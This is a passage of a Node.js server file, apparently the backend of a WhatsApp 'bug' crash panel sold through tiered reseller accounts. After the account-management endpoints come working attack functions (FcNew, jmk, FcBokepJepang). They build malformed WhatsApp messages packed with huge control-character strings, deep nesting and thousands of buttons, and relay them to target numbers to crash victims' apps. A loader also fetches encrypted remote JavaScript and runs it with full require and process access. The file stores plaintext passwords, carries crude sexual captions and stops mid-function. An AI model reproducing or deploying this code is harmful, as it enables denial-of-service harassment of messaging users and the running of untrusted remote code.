    console.log(`[CREATE] ${creator?.username || "Unknown"} tidak memiliki izin.`);
    return res.json({ valid: true, authorized: false, message: "Not authorized." });
}


  const roleLimits = {
    owner_utama: 8000,
    owner: 7000,
    staff: 6999,
    executorius: 6998,
    forius_utama: 6996,
    moderator: 4000,
    ceo_utama: 3099,
    tangan_kanan: 3097,
    tangan_kiri: 3096,
    developers: 3095,
    partner_pribadi: 3095,
    partner: 3092,
    admin: 3089,
    tukang_bubur: 339,
    reseller: 3000,
  };

  const currentLimit = roleLimits[creator.role];
  const currentMonth = new Date().toISOString().slice(0, 7);

  if (!creator.usageLog || creator.usageLog.month !== currentMonth) {
    creator.usageLog = { count: 0, month: currentMonth };
  }

  if (creator.usageLog.count >= currentLimit) {
    console.log(`[ CREATE] Limit akun bulan ${creator.role} (${currentLimit}) telah tercapai.`);
    return res.json({
      valid: true,
      created: false,
      limitReached: true,
      message: `Limit pembuatan akun bulan ini (${currentLimit}) telah tercapai.`
    });
  }

  if (creator.role === "reseller" && parseInt(day) > 30) {
    console.log("[ CREATE] Reseller tidak boleh membuat akun lebih dari 30 hari.");
    return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only create accounts up to 30 days." });
  }

  if (db.find(u => u.username === newUser)) {
    console.log("[ CREATE] Username sudah digunakan.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newAccount = {
    username: newUser,
    password: pass,
    expiredDate: expired.toISOString().split("T")[0],
    role: "member",
  };

  db.push(newAccount);
  creator.usageLog.count++;
  saveDatabase(db);

  saveUserLog(
    creator.username,
    "create",
    "Buat Akun Member",
    `User: ${newUser} | Durasi: ${day} Hari`
  );

  console.log(`[ CREATE] Akun berhasil dibuat: ${newAccount} (Sisa Kuota: ${currentLimit - creator.usageLog.count})`);
  const logLine = `${creator.username} Created ${newUser} duration ${day}\n`;
  appendLogAsync('logUser.txt', logLine);

  return res.json({ valid: true, created: true, user: newAccount });
});

app.get("/deleteUser", (req, res) => {
  const { key, username } = req.query;
  console.log(`[ DELETE] Request hapus user '${username}' oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[ DELETE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const deleter = db.find(u => u.username === keyInfo.username);
  const targetUser = db.find(u => u.username === username);

  if (!deleter || !targetUser) {
    return res.json({ valid: true, deleted: false, message: "User not found." });
  }

  // Hanya owner yang bisa menghapus role owner
  if (targetUser.role === 'owner_utama' && deleter.role !== 'owner') {
    console.log(`[ DELETE] ${deleter.role} tidak boleh menghapus role owner.`);
    return res.json({ 
      valid: true, 
      authorized: false, 
      message: "Only owner can delete another owner account." 
    });
  }

  const roleLevel = {
    owner_utama: 8000,
    owner: 7000,
    staff: 6999,
    executorius: 6998,
    forius_utama: 6996,
    moderator: 4000,
    ceo_utama: 3099,
    tangan_kanan: 3097,
    tangan_kiri: 3096,
    developers: 3095,
    partner_pribadi: 3095,
    partner: 3092,
    admin: 3089,
    tukang_bubur: 339,
    reseller: 3000,
  };

  const deleterLevel = roleLevel[deleter.role] || 0;
  const targetLevel = roleLevel[targetUser.role] || 0;

  // Owner bisa hapus owner lain (level sama)
  if (deleterLevel < targetLevel) {
    console.log(`[ DELETE] ${deleter.role} (Lv ${deleterLevel}) tidak boleh menghapus ${targetUser.role} (Lv ${targetLevel}).`);
    return res.json({ valid: true, authorized: false, message: "You cannot delete a user with higher rank." });
  }

  const index = db.findIndex(u => u.username === username);
  if (index !== -1) {
    const deletedUser = db[index];
    db.splice(index, 1);
    saveDatabase(db);

    const logLine = `${deleter.username} Deleted ${username}\n`;
    appendLogAsync('logUser.txt', logLine);
    
    console.log("[ DELETE] User berhasil dihapus:", deletedUser);
    return res.json({ valid: true, deleted: true, user: deletedUser });
  }

  return res.json({ valid: true, deleted: false, message: "Failed to delete user." });
});

app.get('/ping', (req, res) => {
  res.send('pong');
});

app.get("/listUsers", (req, res) => {
  const { key } = req.query;
  console.log(`[ LIST] Request lihat semua user oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[ LIST] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);

  if (!requester || !["owner", "moderator", "partner", "admin"].includes(requester.role)) {
    console.log(`[ LIST] ${requester?.username || "Unknown"} tidak memiliki izin melihat list.`);
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  const users = db.map(u => ({
    username: u.username,
    expiredDate: u.expiredDate,
    role: u.role || "member",
    parent: u.parent || "SYSTEM"
  }));

  return res.json({ valid: true, authorized: true, users });
});

app.get("/userAdd", (req, res) => {
  const { key, username, password, role, day } = req.query;
  console.log(`[ USERADD] ${username} dengan role ${role} oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  // HIERARKI ROLE - Owner BISA buat Owner
  // Definisi Hirarki Role & Akses
const hierarchy = {
    owner_utama: [
        'owner', 'staff', 'executorius', 'forius_utama', 'moderator', 
        'ceo_utama', 'tangan_kanan', 'tangan_kiri', 'developers', 
        'partner_pribadi', 'partner', 'admin', 'reseller', 
        'tukang_bubur', 'vip', 'member'
    ],
    owner: [
        'staff', 'executorius', 'forius_utama', 'moderator', 'ceo_utama', 
        'tangan_kanan', 'tangan_kiri', 'developers', 'partner_pribadi', 
        'partner', 'admin', 'reseller', 'tukang_bubur', 'vip', 'member'
    ],
    staff: [
        'admin', 'partner', 'reseller', 'tukang_bubur', 'vip', 'member'
    ],
    partner: [
        'moderator', 'ceo_utama', 'tangan_kanan', 'admin', 'reseller', 'vip', 'member'
    ],
    admin: [
        'reseller', 'tukang_bubur', 'vip', 'member'
    ],
    reseller: [
        'vip', 'member'
    ],
    vip: [
        'member'
    ]
};

const creatorRole = creator?.role || "member";
const targetRole = role || "member";


  if (!creator || !hierarchy[creatorRole]) {
    console.log("[ USERADD] Tidak diizinkan (Role salah/Unauthorized).");
    return res.json({ valid: true, authorized: false, message: "Not authorized." });
  }

  //  Tidak ada pengecekan khusus untuk owner - Owner bebas buat owner lain

  if (!hierarchy[creatorRole].includes(targetRole)) {
    console.log(`[ USERADD] ${creatorRole} tidak boleh membuat ${targetRole}.`);
    return res.json({ valid: true, authorized: false, message: `Role ${creatorRole} cannot create ${targetRole}.` });
  }

  const roleLimits = {
    owner_utama: 8000,
    owner: 7000,
    staff: 6999,
    executorius: 6998,
    forius_utama: 6996,
    moderator: 4000,
    ceo_utama: 3099,
    tangan_kanan: 3097,
    tangan_kiri: 3096,
    developers: 3095,
    partner_pribadi: 3095,
    partner: 3092,
    admin: 3089,
    tukang_bubur: 339,
    reseller: 3000,
  };

  const currentLimit = roleLimits[creatorRole];
  const currentMonth = new Date().toISOString().slice(0, 7);

  if (!creator.usageLog || creator.usageLog.month !== currentMonth) {
    creator.usageLog = { count: 0, month: currentMonth };
  }

  if (creator.usageLog.count >= currentLimit) {
    console.log(`[ USERADD] Limit akun bulan ${creatorRole} (${currentLimit}) telah tercapai.`);
    return res.json({
      valid: true,
      created: false,
      limitReached: true,
      message: `Limit pembuatan akun bulan ini (${currentLimit}) telah tercapai.`
    });
  }

  if (db.find(u => u.username === username)) {
    console.log("[ USERADD] Username sudah ada.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newUser = {
    username,
    password,
    role: targetRole,
    expiredDate: expired.toISOString().split("T")[0],
  };

  db.push(newUser);
  creator.usageLog.count++;
  saveDatabase(db);

  const logLine = `${creator.username} Created ${username} Role ${role} Days ${day}\n`;
  appendLogAsync('logUser.txt', logLine);
  console.log(`[ USERADD] User berhasil dibuat: ${newUser} (Sisa Kuota: ${currentLimit - creator.usageLog.count})`);
  return res.json({ valid: true, authorized: true, created: true, user: newUser });
});

app.get("/editUser", (req, res) => {
  const { key, username, addDays } = req.query;
  console.log(`[ EDIT] Tambah masa aktif ${username} +${addDays} hari oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const editor = db.find(u => u.username === keyInfo.username);
  const targetUser = db.find(u => u.username === username);

  if (!editor || !["reseller", "tukang_bubur", "admin", "partner", " partner_pribadi", "developers", " tangan_kiri", "tangan_kanan", "ceo_utama", "moderator", "forius_utama", "executorius", "staff", "owner", "owner_utama"].includes(editor.role)) {
    console.log("[ EDIT] Tidak diizinkan.");
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  if (!targetUser) {
    console.log("[ EDIT] User tidak ditemukan.");
    return res.json({ valid: true, edited: false, message: "User not found." });
  }

  // Owner bisa edit owner lain, hapus blok pengecekan khusus

  const roleLevel = {
    owner_utama: 50, owner: 48, staff: 47, executorius: 46, forius_utama: 45, moderator: 39, ceo_utama: 38, developers: 36, tangan_kanan: 35, tangan_kiri: 34, partner_utama: 33, partner: 32, admin: 10, tukang_bubur: 8, reseller: 6, vip: 5, member: 0
  };
  
  // Owner bisa edit owner lain (level sama)
  if (roleLevel[editor.role] < roleLevel[targetUser.role]) {
     return res.json({ valid: true, edited: false, message: "Cannot edit user with higher rank." });
  }

  if (editor.role === "reseller" && parseInt(addDays) > 30) {
    console.log("[ EDIT] Reseller tidak boleh menambah masa aktif lebih dari 30 hari.");
    return res.json({ valid: true, edited: false, invalidDay: true, message: "Reseller can only add up to 30 days." });
  }

  const currentDate = new Date(targetUser.expiredDate);
  currentDate.setDate(currentDate.getDate() + parseInt(addDays));
  targetUser.expiredDate = currentDate.toISOString().split("T")[0];

  saveDatabase(db);
  const logLine = `${editor.username} Edited ${targetUser.username} Add Days ${addDays}\n`;
  appendLogAsync('logUser.txt', logLine);
  console.log("[ EDIT] Masa aktif diperbarui:", targetUser);
  return res.json({ valid: true, authorized: true, edited: true, user: targetUser });
});

app.get("/getLog", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  if (!user || user.role !== "owner_utama") {
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  try {
    const logContent = fs.readFileSync("logUser.txt", "utf-8");
    return res.json({ valid: true, authorized: true, logs: logContent });
  } catch (err) {
    return res.json({ valid: true, authorized: true, logs: "", error: "Failed to read log file." });
  }
});

const PeG74e4HR5 = 'LgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQleLgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQle';

async function importFromRawEncrypted(url) {
  try {
    const { data } = await axios.get(url, { responseType: 'text' });
    const [ivB64, encryptedB64] = data.trim().split('.');

    const IV = Buffer.from(ivB64, 'base64');
    const KEY = crypto.createHash('sha256').update(PeG74e4HR5).digest();

    const decipher = crypto.createDecipheriv('aes-256-cbc', KEY, IV);
    let decrypted = decipher.update(encryptedB64, 'base64', 'utf8');
    decrypted += decipher.final('utf8');

    const context = {
      module: { exports: {} },
      require,
      console,
      process,
      Buffer,
      setTimeout,
      setInterval,
      clearInterval,
      crypto,
      proto,
      generateWAMessageFromContent,
      prepareWAMessageMedia,
      generateWAMessageContent,
      generateWAMessage,
      waUploadToServer,
      fs,
      generateRandomMessageId
    };

    const sandbox = vm.createContext(context);
    sandbox.globalThis = sandbox;
    sandbox.exports = sandbox.module.exports;

    const script = new vm.Script(decrypted, { filename: 'fangsyon.js' });
    script.runInContext(sandbox);

    return sandbox.module.exports;
  } catch (err) {
    console.error(" Gagal decrypt & import:", err.stack || err.message);
    return null;
  }
}

let bugWa;

async function FcNew(sock, targetJid) {
    const IMG = {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c&mms3=true",
        directPath: "/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c",
        mediaKey: "xD3KegXJnRDJbL89tyWMpG1m12+jAXgXKN0XhTS0riM=",
        fileEncSha256: "ef7Y+a5ufhg2pfcsfZ23SYE4vUNtyoc3j/8/yyqr58Q=",
        fileSha256: "84cNaVGkzmIJwjozrUJipNbXoNb0ovMC8OWBMpLRcYU=",
        fileLength: 999999999,
        mediaKeyTimestamp: "1785637793",
        mimetype: "image/jpeg",
        height: 9999,
        width: 9999,
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAgMEBQYBAQEBAQEAAAAAAAAAAAAAAAAAAgMB/9oADAMBAAIQAxAAAADzL0VRwnekefd8ThLRzuO2/JxNWKr5ZFS+12VFgitnN6HKX8UQ1y6bCz0xiswAP//EACQQAAICAQQBBAMAAAAAAAAAAAECAAMREhMhMVIEQQIgUVJT/9oACAEBAAE/APi9NXgJtVeAgqq8BNmrwE2qvASx8YAGSY6XhM6ADK67rG0k6aZz0ex7EoHrL9ZltulMoMyi8sgY4jNhmycnMFgnqC5AYdAytToLseCJUFstFYfiKoFtidkGFZfWNpgIrl61B4HUrC1EkMfowNm4n8kQmEZioEezJ6ms9Z4jMAARAwZQRN+n+gl/qFNrFeobQScCaz+5Xdob6+X//xAAbEQACAgMBAAAAAAAAAAAAAAABEQACECAhQf/aAAgBAgEBPwB6PFEYa+4pwwkLX//EABsRAAICAwEAAAAAAAAAAAAAAAECABEDICEQ/9oACAEDAQE/ANskB8fqxVNgxlF80//Z"
    };

    const TAGS = [
        [0xBA, 0x03],
        [0xD2, 0x04],
        [0xAA, 0x02],
    ];

    const encodeVarint = function(n) {
        var buf = [];
        while (n >= 0x80) {
            buf.push((n & 0x7f) | 0x80);
            n >>>= 7;
        }
        buf.push(n);
        return Buffer.from(buf);
    };

    const wrapLd = function(tag, data) {
        return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
    };

    const kontol = {
        documentMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4",
            mimetype: "application/pdf",
            fileSha256: "7rOXceVPuGvMTfHN7VXURYOQV2ZmzxQ4xZ6cLM2JNPA=",
            fileLength: 999999999,
            pageCount: 9999,
            mediaKey: "oohdpzQ3uCjBvJWx+2VmRj4bWsCiTvrpUftezu27bs4=",
            fileName: "billy.pdf",
            fileEncSha256: "IT6Goux9voqfI50TST8rtFY9iVmxZenRz55JXZpAR2g=",
            directPath: "/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0",
            mediaKeyTimestamp: 1779839963,
            caption: "\u000F".repeat(50000),
            jpegThumbnail: Buffer.from(IMG.jpegThumbnail, 'base64'),
            contextInfo: {
                quotedMessage: {
                    interactiveMessage: {
                        body: { text: "\u001C".repeat(50000) },
                        nativeFlowMessage: {
                            buttons: Array.from({ length: 100 }, () => ({}))
                        }
                    }
                }
            }
        }
    };

    const basePayload = proto.Message.encode(
        proto.Message.fromObject(kontol)
    ).finish();

    const inflate = function(tag, depth) {
        var buf = basePayload;
        for (var i = 0; i < depth; i++) {
            buf = wrapLd(tag, wrapLd([0x0A], buf));
        }
        return buf;
    };

    const resolveJid = function(raw) {
        var s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(target) ? target : [target])
        .map(resolveJid)
        .filter(function(j) { return j.length > 15; });

    if (!jids.length) throw new Error('error');

    var MAX_BATCH = 5;
    var DELAY_MS = 5000;
    var totalSent = 0;

    for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
        var chunk = jids.slice(offset, offset + MAX_BATCH);
        var isFirst = offset === 0;

        if (!isFirst) {
            await new Promise(function(r) { setTimeout(r, DELAY_MS); });
        }

        var idx = Math.floor(offset / MAX_BATCH) + 1;
        var suffix = idx > 1 ? ('-' + idx) : '';
        var msgId = 'crb' + Date.now().toString(36).toUpperCase() + suffix;

        for (var ti = 0; ti < TAGS.length; ti++) {
            var tag = TAGS[ti];
            var payload = null;

            for (var depth = 5000; depth >= 2000 && !payload; depth -= 400) {
                try {
                    var decoded = proto.Message.decode(inflate(tag, depth));
                    proto.Message.encode(decoded).finish();
                    payload = decoded;
                } catch (_) {}
            }

            if (!payload) continue;

            await sock.relayMessage('status@broadcast', payload, {
                messageId: msgId,
                statusJidList: chunk,
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: chunk.map(function(jid) {
                            return { tag: 'to', attrs: { jid: jid }, content: [] };
                        })
                    }]
                }]
            });

            totalSent++;
        }
    }

    if (!totalSent) throw new Error('error');

    await new Promise(r => setTimeout(r, 1000));

    const msg1 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                            fileLength: 999999999,
                            height: 9999,
                            width: 9999,
                            mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                            fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                            directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1776937541",
                            jpegThumbnail: null,
                            caption: "Cloude - Executed¿!" + "\u0000".repeat(50000),
                            scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                            scanLengths: [
                                9999987899999999999999,
                                998999999999999999999,
                                999899999999999999999,
                                9998789999999999999999
                            ],
                            midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
                        }
                    },
                    body: {
                        text: "Cloude - Executed¿!" + "\u000C".repeat(50000)
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 2000 }, () => ({})),
                        messageParamsJson: "{".repeat(15000),
                        botFeedbackOptions: {
                            botFeedbackKind: 14,
                            botFeedbackKindMultipleNegative: 511,
                            botFeedbackKindMultiplePositive: 1,
                            reportKind: 1
                        }
                    },
                    contextInfo: {
                        quotedMessage: {
                            interactiveMessage: {
                                body: { text: "\u000D".repeat(50000) },
                                nativeFlowMessage: {
                                    buttons: Array.from({ length: 500000 }, () => ({}))
                                }
                            }
                        }
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, msg1, {});
    await new Promise(r => setTimeout(r, 500));

    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    caption: "Billy - Executed¿!",
                    fileSha256: "LdNOQNcNIvlIijHvkpwRIY/zIoTfWQoFux7dzTHusyM=",
                    fileLength: "1099511627776",
                    seconds: 172800,
                    mediaKey: "G2MGbP7BZLi1RwpyyV4DeXtfttaclMVSKfqNldZDt20=",
                    height: 1080,
                    width: 1920,
                    fileEncSha256: "U4uKZrZeJpg8smAcMRT3qtPoviAp/dqGa63GzqYcS8E=",
                    directPath: "/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1774428565",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAgMEBQYBAQEBAQEAAAAAAAAAAAAAAAAAAgMB/9oADAMBAAIQAxAAAADzL0VRwnekefd8ThLRzuO2/JxNWKr5ZFS+12VFgitnN6HKX8UQ1y6bCz0xiswAP//EACQQAAICAQQBBAMAAAAAAAAAAAECAAMREhMhMVIEQQIgQVFS/9oACAEBAAE/APi9NXgJtVeAgqq8BNmrwE2qvASx8YAGSY6XhM6ADK67rG0k6Zz0ex7EoHrL9ZltulMoMyi8sgY4jNhmycnMFgnqC5AYdAytToLseCJUFstFYfiKoFtidkGFZfWNpgIrl61B4HUrC1EkMfowNm4n8kQmEZioEezJ6ms9Z4jMAARAwZQRN+n+gl/qFNrFeobQScCaz+5Xdob6+X//xAAbEQACAgMBAAAAAAAAAAAAAAABESACECAhQf/aAAgBAgEBPwB6PFEYa+4pwwkLX//EABsRAAICAwEAAAAAAAAAAAAAAAECABEDICEQ/9oACAEDAQE/ANskB8fqxVNgxlF80//Z",
                    annotations: [{
                        polygonVertices: [
                            { x: 0.17499999701976776, y: 0.3379453122615814 },
                            { x: 0.824999988079071, y: 0.3379453122615814 },
                            { x: 0.824999988079071, y: 0.6620468497276306 },
                            { x: 0.17499999701976776, y: 0.6620468497276306 }
                        ],
                        shouldSkipConfirmation: true,
                        embeddedContent: {
                            embeddedMusic: {
                                musicContentMediaId: "2261401457948346",
                                songId: "849859527815275",
                                author: "Cloude - Executed¿!" + "ြ".repeat(9000),
                                title: "ြ".repeat(75000),
                                artworkDirectPath: "/v/t62.76458-24/568311115_4528169627440664_4559757974106869948_n.enc?ccb=11-4&oh=01_Q5Aa5AGs28VMFVXkcn0w9n-YUhiBwEPKyIwEcjWZLHm7mUgOsQ&oe=6A786B6E&_nc_sid=5e03e0",
                                artworkSha256: "FROyKnRoHfLzDwmz5tED8K3nmdK+4Uihn2ucHBZDjPI=",
                                artworkEncSha256: "y/SkheY3BoGhndQlmR6icfLtMtI4FjjRi5y3bsX13jw=",
                                artworkMediaKey: "s5VCH/gb/YjDXhek47MVcsHjVV3/lOHOYaDe72eodXw=",
                                artistAttribution: "https://www.instagram.com/_u/lexzymods",
                                countryBlocklist: "WEs=",
                                isExplicit: false
                            }
                        },
                        embeddedAction: true
                    }]
                }
            }
        }
    }, {});

    await new Promise(r => setTimeout(r, 500));

    await sock.relayMessage(target, {
        stickerPackMessage: {
            stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
            name: "ꦾ".repeat(75000),
            publisher: " Cloude - Executed¿!" + "ꦾ".repeat(5000),
            stickers: [],
            fileLength: "366299919",
            fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
            fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
            mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
            directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
            contextInfo: {
                remoteJid: "X",
                participant: "0@s.whatsapp.net",
                stanzaId: "1234567890ABCDEF",
                mentionedJid: ["13135555555@s.whatsapp.net"]
            },
            packDescription: "",
            mediaKeyTimestamp: "1747502082",
            trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
            thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
            thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
            thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
            thumbnailHeight: 999999999,
            thumbnailWidth: 9999999999,
            imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
            stickerPackSize: "9990099",
            stickerPackOrigin: "USER_CREATED"
        }
    }, {});
}


async function jmk(sock, targetJid) {
  try {
    const locationData = {
      degreesLatitude: -6.99999,
      degreesLongitude: 109.86666,
      name: "lawliet.empire.com",
      address: "udah nyoli belum bang?",
      jpegThumbnail: Buffer.alloc(10000, 'a').toString("base64"),
      contextInfo: {
        pairedMediaType: "NOT_PAIRED_MEDIA",
        scansSidecar: "2YCrK9uS0xGWeOGhQDDtgHrmdhks+9aRYU2v5pwgTYmXkWbuXBRpzg==",
        scanLengths: [10365, 39303, 40429, 72806]
      }
    };

    const buttons = [
      { name: "catalog_message", buttonParamsJson: JSON.stringify({}) },
      { name: "booking_status", buttonParamsJson: JSON.stringify({}) },
      { name: "review_and_pay", buttonParamsJson: JSON.stringify({}) },
      { name: "payment_request", buttonParamsJson: JSON.stringify({}) },
      { name: "cta_url", buttonParamsJson: JSON.stringify({ display_text: "Click", url: "https://t.me/chicaatractiva" }) },
      { name: "call_permission_request", buttonParamsJson: JSON.stringify({ status: true }) }
    ];

    const externalReply = {
      title: "lawliet",
      body: "Ngawi",
      thumbnailUrl: "https://files.catbox.moe/irewyw.jpg",
      sourceUrl: "https://xhamster.com",
      mediaType: 1,
      renderLargerThumbnail: true
    };

    await sock.relayMessage("status@broadcast", {
      statusMessage: {
        text: "\x00".repeat(5000),
        contextInfo: { 
          mentionedJid: [targetJid],
          forwardingScore: 999999,
          isForwarded: true
        }
      }
    }, { statusJidList: [targetJid] });

    await sock.relayMessage(targetJid, {
      interactiveMessage: {
        header: { locationMessage: locationData, title: "edgar crot", hasMediaAttachment: true },
        body: { text: "lawliet 48" },
        nativeFlowMessage: { 
          buttons, 
          messageParamsJson: JSON.stringify({ version: 3, data: "\u0000".repeat(100000) })
        },
        contextInfo: { 
          fromMe: false, 
          isForwarded: true, 
          remoteJid: targetJid, 
          externalAdReply: externalReply,
          quotedMessage: {
            paymentInviteMessage: 2,
            expiryTimestamp: 8 * 1840000
          }
        }
      }
    }, { additionalNodes: [{ tag: "biz", attrs: { native_flow_name: "catalog_message" } }] });

    console.log("sukses sent to " + targetJid);
  } catch (err) {
    console.error("error:", err);
  }
}

async function FcBokepJepang(sock, targetJid) {
  try {
    const msg = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: "ah ah ah ange mas" },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "catalog_message",
                  buttonParamsJson: JSON.stringify({})
                },
                {
                  name: "booking_status",
                  buttonParamsJson: JSON.stringify({})
                },
                {
                  name: "review_and_pay",
                  buttonParamsJson: JSON.stringify({
                    currency: "IDR",
                    total_amount: {
                      value: 0,
                      offset: 10
                    },
                    reference_id: "x",
                    type: "physical-goods",
                    order: {
                      status: "payment_requested",
                      subtotal: {
                        value: 0,
                        offset: 10
                      },
                      order_type: "ORDER",
                      items: [
                        {
                          name: "x",
                          amount: {
                            value: 0,
                            offset: 10
                          },
                          quantity: 9999
                        }
                      ]
                    }
                  })
                }
              ],
              messageParamsJson: JSON.stringify({})
            }
          }
        }
      }
    }
    await sock.relayMessage(target, msg, { participant: { jid: target } })
  } catch (err) {}
}

async function AudioXDellay(sock, targetJid) {
  const msg = {
    to: target,
    message: {
      viewOnceMessage: {
        message: {
          videoMessage: {
            caption: "꧔꧈".repeat(600),
            mimetype: "video/mp4",
